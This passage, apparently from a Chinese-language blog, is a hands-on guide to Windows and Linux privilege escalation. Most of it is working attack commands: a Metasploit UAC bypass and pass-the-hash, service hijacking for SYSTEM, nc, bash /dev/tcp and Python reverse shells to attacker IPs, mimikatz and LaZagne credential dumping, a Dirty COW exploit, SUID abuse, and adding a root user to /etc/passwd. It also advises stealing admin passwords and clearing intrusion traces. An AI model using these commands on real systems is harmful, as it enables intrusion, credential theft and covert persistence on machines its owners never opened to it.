绕过exp</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#用kali</span><br><span class="line">use exploit/windows/local/ask</span><br><span class="line"></span><br><span class="line">meterpreter &gt; background  [*] Backgrounding session 1... </span><br><span class="line">msf5 exploit(multi/handler) &gt; use exploit/windows/local/ask </span><br><span class="line">msf5 exploit(windows/local/ask) &gt; set session 1 </span><br><span class="line">msf5 exploit(windows/local/ask) &gt; set lhost 192.168.60.79 </span><br><span class="line">msf5 exploit(windows/local/ask) &gt; set lport 4444 </span><br><span class="line">msf5 exploit(windows/local/ask) &gt; set payload windows/meterpreter/reverse_tcp </span><br><span class="line">msf5 exploit(windows/local/ask) &gt; set technique exe </span><br><span class="line">msf5 exploit(windows/local/ask) &gt; exploit </span><br><span class="line"></span><br><span class="line">其他exp:</span><br><span class="line">use exploit/windows/local/bypassuacuse</span><br><span class="line">exploit/windows/local/bypassuac</span><br></pre></td></tr></table></figure><h3 id="二、利用系统内核溢出漏洞提权"><a href="#二、利用系统内核溢出漏洞提权" class="headerlink" title="二、利用系统内核溢出漏洞提权"></a>二、利用系统内核溢出漏洞提权</h3><p>此提权方法即是通过系统本身存在的一些漏洞，未曾打相应的补丁而暴露出来的提权方法，依托可以提升权限的EXP和它们的补丁编号，进行提升权限。</p><p><strong>微软官方时刻关注漏洞补丁列表网址:</strong><br><a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/securitybulletins2017">https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/securitybulletins2017</a></p><blockquote><p>比如常用的几个已公布的 exp：KB2592799、KB3000061、KB2592799</p></blockquote><p><strong>github中整理好的溢出提权exp：</strong><br><a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a><br><a href="https://github.com/WindowsExploits/Exploits">https://github.com/WindowsExploits/Exploits</a><br><a href="https://github.com/AusJock/Privilege-Escalation">https://github.com/AusJock/Privilege-Escalation</a></p><h4 id="如何判断可用的漏洞"><a href="#如何判断可用的漏洞" class="headerlink" title="如何判断可用的漏洞"></a>如何判断可用的漏洞</h4><ol><li><p><strong>快速查找操作系统未打补丁脚本</strong><br>可以最安全的减少目标机的未知错误，以免影响业务。 命令行下执行检测未打补丁的命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo&gt;micropoor.txt&amp;(for \%i in ( KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780 ) do @type micropoor.txt|@find /i &quot;\%i&quot;|| @echo \%i you can fuck)&amp;del /f /q /a micropoor.txt</span><br></pre></td></tr></table></figure></li><li><p><strong>MSF后渗透扫描：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post/windows/gather/enum_patches</span><br></pre></td></tr></table></figure></li><li><p><strong>Powershell扫描：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module C:\Sherlock.ps1</span><br><span class="line">Find-AllVulns</span><br></pre></td></tr></table></figure></li></ol><h3 id="三、利用SC将administrator提权至system"><a href="#三、利用SC将administrator提权至system" class="headerlink" title="三、利用SC将administrator提权至system"></a>三、利用SC将administrator提权至system</h3><p><strong>试用版本：</strong>windows 7、8、03、08、12、16</p><p>关于sc命令：SC 是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于“控制面板”中“管理工具”项中的“服务”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc Create syscmd binPath= “cmd /K start” type= own type= interact</span><br><span class="line">sc start systcmd</span><br></pre></td></tr></table></figure><blockquote><p>命令含义：<br>创建一个名叫syscmd的新的交互式的cmd服务<br>然后执行<code>sc start systcmd</code>，就得到了一个system权限的cmd环境</p></blockquote><h3 id="四、利用不带引号的服务路径"><a href="#四、利用不带引号的服务路径" class="headerlink" title="四、利用不带引号的服务路径"></a>四、利用不带引号的服务路径</h3><p><strong>检测方法</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure><p><strong>Windows命令解释程序可能会遇到名称中的空格，并且没有包装在引号中的时候。就有可能出现解析漏洞。</strong><br>如开机自启动中有程序路径<code>C:\Program Files\Vulnerable.exe</code>,其中存在空格，此时在C盘根目录上传Program.exe文件时，可能会被目标开机自启动。如果无效，还可以尝试在C:\Program Files路径下上传Vulnerable.exe文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Program.exe</span><br><span class="line">C:\Program Files\Vulnerable.exe</span><br><span class="line">C:\Program Files\Vulnerable Service\Sub.exe</span><br><span class="line">C:\Program Files\Vulnerable Service\Sub Directory\service.exe</span><br></pre></td></tr></table></figure><p><strong>可以使用以下命令查看错误配置的路径</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure><h3 id="五、利用不安全的服务权限"><a href="#五、利用不安全的服务权限" class="headerlink" title="五、利用不安全的服务权限"></a>五、利用不安全的服务权限</h3><p><strong>⚫即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它。</strong><br><strong>AccessChk工具可以用来查找用户可以修改的服务：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -uwcqv “Authenticated Users” * /accepteula</span><br><span class="line">accesschk.exe -uwcqv “user” *</span><br></pre></td></tr></table></figure><p><strong>sc命令也可以用来查找用户可以修改的服务：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#查找可以修改的服务</span><br><span class="line">sc qc “Service”  </span><br><span class="line"></span><br><span class="line">sc config xxx binpath= “net user rottenadmin P@ssword123! /add”</span><br><span class="line">sc stop xxx</span><br><span class="line">sc start xxx</span><br></pre></td></tr></table></figure><p>每当我们开启服务时sc命令都返回了一个错误。这是因为net user命令没有指向二进制服务，因此SCM无法 与服务进行通信，通过使用执行自动迁移到新进程的payload，手动迁移进程，或者在执行后将服务的bin路径设置回原始服务二进制文件，可以解决这个问题。或者我们在权限允许的情况下，将我们的木马放到服务目录下，并重命名为服务启动的应用名称。电脑重启时即可获得一个system的shell</p><h5 id="完整案例："><a href="#完整案例：" class="headerlink" title="完整案例："></a>完整案例：</h5><p><strong>①、利用系统自带的 DcomLaunch服务测试(此服务Power User组低权可操作)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#查询DcomLaunch的详细信息</span><br><span class="line">sc qc DcomLaunch</span><br><span class="line">#查看服务是否启动</span><br><span class="line">net start | find &quot;DCOM Server Process Launcher&quot;  </span><br><span class="line"></span><br><span class="line">#运行 tasklist /svc  找到对应服务</span><br><span class="line">tasklist /svc</span><br></pre></td></tr></table></figure><p><strong>②、修改服务并获取系统权限</strong></p><p>这里要配置使用nc反弹shell到我的攻击机上，把nc放到c:\windows\temp目录下，使用sc对服务进行修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc config DcomLaunch binpath= &quot;C:\wmpub\nc.exe -nv 192.168.32.194 4433 -e C:\WINDOWS\system32\cmd.exe&quot;  </span><br></pre></td></tr></table></figure><p>⛔注意<code>binpath=</code>后面一定要有个空格，IP为攻击者IP</p><p><strong>③、查看是否第二步成功</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc qc DcomLaunch </span><br></pre></td></tr></table></figure><p><strong>④、配置账号密码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc config DcomLaunch obj= &quot;.\LocalSystem&quot;  password= &quot;&quot;</span><br></pre></td></tr></table></figure><p><strong>obj：</strong>指定运行服务将使用的帐户名，或指定运行驱动程序将使用的 Windows 驱动程序对象名。默认设置为 LocalSystem。<br><strong>password：</strong>指定一个密码。如果使用了非 LocalSystem 的帐户，则此项是必需的。</p><p><strong>⑤、重启服务</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start DcomLaunch </span><br></pre></td></tr></table></figure><p><strong>⑥、攻击机上用nc进行监听4433即可得到反弹的shell</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -vv -l -p 4433</span><br></pre></td></tr></table></figure><h3 id="六、计划任务"><a href="#六、计划任务" class="headerlink" title="六、计划任务"></a>六、计划任务</h3><p><strong>如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用恶意程序覆盖原来的程序，这样在下次计划执行时，就会以高权限来运行恶意程序。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#查看计算机的计划任务</span><br><span class="line">schtasks /query /fo LIST /v</span><br><span class="line">#查看指定目录的权限配置情况</span><br><span class="line">accesschk.exe -dqv &quot;D:\test&quot; -accepteula</span><br></pre></td></tr></table></figure><h3 id="七、Meterpreter基础提权"><a href="#七、Meterpreter基础提权" class="headerlink" title="七、Meterpreter基础提权"></a>七、Meterpreter基础提权</h3><p><strong>首先在Meterpreter会话执行ps命令查看目标机当前进程：</strong><br>假设此处看到了一个进程，运行账户是域管理员，我们可以再第一栏找到对应的进程PID，假设PID为2584：<br>然后我们可以执行以下语句窃取该用户进程的令牌：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steal_token  2584</span><br></pre></td></tr></table></figure><h2 id="溢出漏洞安全防范"><a href="#溢出漏洞安全防范" class="headerlink" title="溢出漏洞安全防范"></a>溢出漏洞安全防范</h2><p><strong>及时通过Windows Update或第三方工具360更新补丁</strong></p><h2 id="提权后获取管理员密码"><a href="#提权后获取管理员密码" class="headerlink" title="提权后获取管理员密码"></a>提权后获取管理员密码</h2><p>虽然我们已经有了管理员权限，但是我们最好是再获取管理员密码，原因如下</p><ol><li>很多管理员账号密码都设置成一样的，攻下一台就可以拿下所有</li><li>远程连接时，比如使用木马，很容易被发现或者清理</li><li>如果用管理员账号，可以清除渗透痕迹</li><li>正规渗透测试过程中，都是取得管理员账号密码，登录3389端口或反端口连接者证明为成功</li></ol><blockquote><p>简单地说就是从获取管理员权限——&gt;获取管理员账号</p></blockquote><h3 id="1、本地管理员密码如何直接提取"><a href="#1、本地管理员密码如何直接提取" class="headerlink" title="1、本地管理员密码如何直接提取"></a>1、本地管理员密码如何直接提取</h3><h4 id="①、直接通过mimikatz读取管理员密码"><a href="#①、直接通过mimikatz读取管理员密码" class="headerlink" title="①、直接通过mimikatz读取管理员密码"></a>①、直接通过mimikatz读取管理员密码</h4><blockquote><p>mimikatz，很多人称之为密码抓取神器，它的功能很多，最重要的是能从 lsass.exe进程中获取windows的账号及明文密码——这是以前的事了，微软知道后已经准备了补丁，lsass进程不再保存明文口令。Mimikatz 现在只能读到加密后的密码。<br><strong>win10无效</strong></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 提升权限</span><br><span class="line">privilege::debug</span><br><span class="line"># 抓取密码</span><br><span class="line">sekurlsa::logonpassWords</span><br></pre></td></tr></table></figure><p>当无法上传mimikatz工具到目标服务器时，可以利用procdump把lsass进程的内存文件导出本地，再在本地利用mimikatz读取密码，具体步骤如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 导出lsass.exe进程为lsass.dump文件</span><br><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp </span><br><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure><h4 id="②、Lazagne-需要本地支持python"><a href="#②、Lazagne-需要本地支持python" class="headerlink" title="②、Lazagne 需要本地支持python"></a>②、Lazagne 需要本地支持python</h4><blockquote><p>LaZagne项目是用于开源应用程序获取大量的密码存储在本地计算机上。每个软件都使用不同的技术（纯文本，API，自定义算法，数据库等）存储其密码。<br>LaZagne 几乎支持市面上大部分常用工具。包括浏览器、Git、SVN、Wifi、Databases 等。<br>但是对聊天软件的支持不够本土化，主要支持一些国外的聊天软件。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">laZagne.exe all  #获取所有密码</span><br><span class="line">laZagne.exe browsers  #只获取浏览器记住的密码</span><br><span class="line">laZagne.exe all -oN  #将输出保存到文件    </span><br></pre></td></tr></table></figure><p>-oN表示是纯文本格式（正常的）的输出，和屏幕打印内容相同；还可以写成-oJ，JSON格式的输出，更便于程序解析；或者写成-oA，同时输出两种格式。</p><h3 id="2、本地Hash远程直接登录"><a href="#2、本地Hash远程直接登录" class="headerlink" title="2、本地Hash远程直接登录"></a>2、本地Hash远程直接登录</h3><hr><p>高版本的系统，密码不是明文的情况下，直接通过哈希值来取得管理员账号。主要通过MSF提供的exploit&#x2F;windows&#x2F;smb&#x2F;psexec模块来完成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf&gt;use exploit/windows/smb/psexec</span><br><span class="line">msf&gt;set rhost #目标IP </span><br><span class="line">msf&gt;set SMBUser administrator  #目标账号</span><br><span class="line">msf&gt;set SMBPass aaaaaa:bbbbbb  #目标哈希值</span><br><span class="line">msf&gt;exploit </span><br><span class="line">msf&gt;shell</span><br></pre></td></tr></table></figure><h3 id="3、Hash密钥暴力破解"><a href="#3、Hash密钥暴力破解" class="headerlink" title="3、Hash密钥暴力破解"></a>3、Hash密钥暴力破解</h3><hr><ol><li>通过LC5暴力hash密码<br>使用gmer直接提权SAM和system文件或用Pwdump7提取hash后，最后使用LC5破解</li><li>使用ophcrack破解系统hash密码<br><a href="http://simeon.blog.51cto.com/18680/122160">http://simeon.blog.51cto.com/18680/122160</a></li></ol><h1 id="Linux系统提权"><a href="#Linux系统提权" class="headerlink" title="Linux系统提权"></a>Linux系统提权</h1><p>当拿到了一台Linux服务器的低权限账号后，要通过技术手段提权至 root 用户权限，以执行更多的操作。首先关于Linux提权我们得先明白几个概念。</p><h2 id="linux内核知识"><a href="#linux内核知识" class="headerlink" title="linux内核知识"></a>linux内核知识</h2><p>Linux内核版本号由3组数字组成：第一个组数字：内核主版本。 第二个组数字：偶数表示稳定版本；奇数表示开发中版本。第三个组数字：错误修补的次数。<br>3.10.0就是内核版本号。3就是内核主版本，10表示是稳定版，0表示错误修补次数是0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#使用以下命令也可以看到系统内核及版本的一些信息：</span><br><span class="line">uname -a                 #查看内核的具体信息</span><br><span class="line">cat /proc/version        #查看内核的具体信息</span><br><span class="line">cat /etc/centos-release  #查看centos发行版本</span><br><span class="line">cat /etc/redhat-release  #查看redhat发行版本</span><br></pre></td></tr></table></figure><h2 id="Linux提权方法总结"><a href="#Linux提权方法总结" class="headerlink" title="Linux提权方法总结"></a>Linux提权方法总结</h2><p>Linux提权的前提：</p><ol><li>拿到了一个低权限的账号</li><li>能上传和下载文件</li><li>机器上有python、java、perl等环境（非必须项）</li></ol><h3 id="一、Linux反弹提权"><a href="#一、Linux反弹提权" class="headerlink" title="一、Linux反弹提权"></a>一、Linux反弹提权</h3><p>**如果手里只有webshell可以利用反弹shell来得到一个shell，反弹的权限是中间件的权限。 **</p><h4 id="1、NC反弹shell"><a href="#1、NC反弹shell" class="headerlink" title="1、NC反弹shell"></a>1、NC反弹shell</h4><p><strong>NC详情参考：</strong><a href="https://www.cnblogs.com/nmap/p/6148306.html">https://www.cnblogs.com/nmap/p/6148306.html</a></p><p><strong>①nc参数介绍</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-l指定nc将处于侦听模式，nc被当作server，侦听并接受连接。</span><br><span class="line">-p&lt;port&gt;指定端口，老版本才需要-p</span><br><span class="line">-s指定发送数据的源IP地址，适用于多网卡机</span><br><span class="line">-u指定nc使用UDP协议，默认为TCP</span><br><span class="line">-v输出交互或出错信息，新手调试时尤为有用</span><br><span class="line">-w超时秒数，后面跟数字</span><br><span class="line">-z表示zero，表示扫描时不发送任何数据</span><br></pre></td></tr></table></figure><p><strong>②nc做tcp监听</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 开启本地8080端口监听</span><br><span class="line">nc nc -l -p 80802</span><br></pre></td></tr></table></figure><p><strong>③nc反弹服务器shell</strong></p><p><strong>方法⑴：</strong>公网主机绑定SHELL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#在公网监听端口5555端口,并绑定shell</span><br><span class="line">nc -lp 5555 -t -e cmd.exe</span><br><span class="line">#在内网主动建立到外网IP:5555的连接</span><br><span class="line">nc -nvv x.x.x.x 5555</span><br></pre></td></tr></table></figure><p><strong>方法⑵：</strong>内网主机绑定SHELL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#在公网监听端口</span><br><span class="line">nc -lp 5555</span><br><span class="line">#在内网机器绑定shell反弹</span><br><span class="line">nc -t -e cmd x.x.x.x 5555</span><br></pre></td></tr></table></figure><h4 id="2、利用bash直接反弹"><a href="#2、利用bash直接反弹" class="headerlink" title="2、利用bash直接反弹"></a>2、利用bash直接反弹</h4><p><strong>（1） bash反弹一句话</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#先公网监听</span><br><span class="line">nc -l -p 8080</span><br><span class="line">#在内网bash反弹</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/x.x.x.x/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>网上还有很多方法一句话反弹shell，需要自行搜索</p><h3 id="二、内核漏洞提权——脏牛"><a href="#二、内核漏洞提权——脏牛" class="headerlink" title="二、内核漏洞提权——脏牛"></a>二、内核漏洞提权——脏牛</h3><ol><li><strong>脏牛漏洞：</strong><br>又叫Dirty COW，存在Linux内核中已经有长达9年的时间，在2007年发布的Linux内核版本中就已经存在此漏洞。Linux kernel团队在2016年10月18日已经对此进行了修复。</li><li><strong>漏洞范围：</strong><br>Linux内核 &gt;&#x3D; 2.6.22（2007年发行，到2016年10月18日才修复）</li><li><strong>简要分析：</strong><br>该漏洞具体为，Linux内核的内存子系统在处理写入复制（copy-on-write, COW）时产生了竞争条件（race condition）。<br>竞争条件，指的是任务执行顺序异常，可导致应用崩溃，或令攻击者有机可乘，进一步执行其他代码。<br>恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问。</li><li><strong>exp：</strong><br><a href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a></li></ol><h4 id="示例：脏牛内核提权"><a href="#示例：脏牛内核提权" class="headerlink" title="示例：脏牛内核提权"></a>示例：脏牛内核提权</h4><ol><li>首先确定发行版、内核版</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*-release</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure><ol><li>根据内核版本，找exp，下载对应dirty.c文件编译</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br></pre></td></tr></table></figure><ol><li>执行当前编译的dirty.c文件，然后输入新密码123456</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./dirty</span><br><span class="line">#执行后，会将原来的passwd文件备份到/tmp目录</span><br><span class="line">#然后创建的新账号是firefart,密码123456</span><br></pre></td></tr></table></figure><ol><li>等创建成功后，切换到firefart用户<br>会发现此用户会发现已经是root权限了。<br>最好立刻再新建一个管理员账号，然后立刻恢复passwd文件。<br>因为这个提权不是新建了一个账号，而已用新账号替换了root账号，所以要把root账号恢复回去</li></ol><h3 id="三、SUID提权"><a href="#三、SUID提权" class="headerlink" title="三、SUID提权"></a>三、SUID提权</h3><p>SUID（设置用户ID）是赋予文件的一种特殊权限，拥有改权限的程序，任何用户执行的时候都是改命令都是以root权限执行的</p><p>suid提权是指这类有S权限的程序，如果能执行命令，那么我们就能从用改程序从普通用户提升到了root权限</p><h4 id="SUID可用命令"><a href="#SUID可用命令" class="headerlink" title="SUID可用命令"></a>SUID可用命令</h4><p><strong>⑴在本地查找符合条件的文件，有以下三个命令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure><p><strong>⑵已知的可用来提权的linux可行性的文件列表如下：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nmap</span><br><span class="line">vim</span><br><span class="line">find</span><br><span class="line">bash</span><br><span class="line">more</span><br><span class="line">less</span><br><span class="line">nano</span><br><span class="line">cp</span><br></pre></td></tr></table></figure><h4 id="示例：利用find文件提权"><a href="#示例：利用find文件提权" class="headerlink" title="示例：利用find文件提权"></a>示例：利用find文件提权</h4><p>假如我们现在拿到了一个网站服务器的shell，但是权限是ubuntu，我们现在需要提权到 root 用户权限。</p><ol><li><p>查看具有root用户权限的SUID文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure></li><li><p>发现有find命令，再确认一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -lh /usr/bin/find</span><br><span class="line">#权限是rwsr-xr-x 确实有s权限</span><br></pre></td></tr></table></figure></li><li><p>测试是否能用find命令以root权限运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/find examples.desktop -exec whoami \;</span><br><span class="line">#发现确实可以以root权限运行</span><br></pre></td></tr></table></figure></li><li><p>然后查看目标网站上是否的python环境<br>linux服务器一般都自带python，区别是有些2.X,有些3.x</p></li><li><p>于是我们以root用户的身份利用python反弹shell，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#反弹一个sh类型的shell</span><br><span class="line">python -c &#x27;import socket,subprocess,os; \</span><br><span class="line">  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); \</span><br><span class="line">  s.connect((&quot;192.168.10.25&quot;,4444)); \</span><br><span class="line">  os.dup2(s.fileno(),0); \</span><br><span class="line">  os.dup2(s.fileno(),1); \</span><br><span class="line">  os.dup2(s.fileno(),2); \</span><br><span class="line">  p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure></li><li><p>远端nc监听<code>nc -lvp 4444</code><br>可以看到，在攻击端收到了反弹过来的shell，并且是root身份</p></li></ol><blockquote><p>本节来自：<a href="https://blog.csdn.net/qq_36119192/article/details/84872644">https://blog.csdn.net/qq_36119192/article/details/84872644</a></p></blockquote><h3 id="四、Linux配置错误提权"><a href="#四、Linux配置错误提权" class="headerlink" title="四、Linux配置错误提权"></a>四、Linux配置错误提权</h3><p><strong>利用Linux的配置文件错误，导致 &#x2F;etc&#x2F;passwd 文件可写入提权</strong></p><p><strong>对Linux配置进行检查的脚本有：</strong><br><a href="https://www.securitysift.com/download/linuxprivchecker.py">https://www.securitysift.com/download/linuxprivchecker.py</a><br><a href="http://pentestmonkey.net/tools/audit/unix-privesc-check">http://pentestmonkey.net/tools/audit/unix-privesc-check</a></p><p><strong>当我们获得了某个Linux服务器的低权限之后，我们想要对该低权限账号进行提权，以执行更多的操作。</strong><br>接下来我们的提权是利用 &#x2F;etc&#x2F;passwd 文件的可写入权限，导致我们写入一个其他用户进去。</p><ol><li><p>查看 &#x2F;etc&#x2F;passwd 的权限，发现任何用户都可以读写。<br>我们现在要做的就是自己构造一个用户，在密码占位符处指定密码，并且UID设置为0，将其添加到 &#x2F;etc&#x2F;passwd 文件中。</p></li><li><p><strong>首先，使用perl语言生成带有盐值的密码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -le &#x27;print crypt(&quot;password@123&quot;,&quot;addedsalt&quot;)&#x27;</span><br></pre></td></tr></table></figure></li><li><p><strong>然后将test用户的信息加入 &#x2F;etc&#x2F;passwd 文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;test:advwtv/9yU5yQ:0:0:User_like_root:/root:/bin/bash&quot; &gt;&gt;/etc/passwd</span><br></pre></td></tr></table></figure></li><li><p><strong>以<code>test/password@123</code>登录主机</strong><br>登录成功后，是 root 权限。</p></li></ol><h3 id="五、定时任务提权"><a href="#五、定时任务提权" class="headerlink" title="五、定时任务提权"></a>五、定时任务提权</h3><p>系统内可能会有一些定时执行的任务，一般这些任务由crontab来管理，具有所属用户的权限。<br>非root权限的用户是不可以列出root 用户的计划任务的。但是系统的计划任务<code>/etc、cron*</code>可以被列出。<br>默认这些程序以root权限执行，如果有幸遇到一个把其中脚本配置成任意用户可写，我们就可以修改脚本进行提权了。</p><ol><li><p>列出系统定时任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /etc/cron*</span><br></pre></td></tr></table></figure></li><li><p>查看列出的目录中，是否允许普通用户修改<br>&#x2F;etc&#x2F;cron.daily 、&#x2F;etc&#x2F;cron.hourly、&#x2F;etc&#x2F;cron.monthly、&#x2F;etc&#x2F;cron.weekly 这四个文件夹内的文件，查看是否允许其他用户修改。<br>如果允许任意用户修改，那么我们就可以往这些文件里面写入反弹shell的脚本提权了。</p></li></ol><h3 id="六、密码复用提权"><a href="#六、密码复用提权" 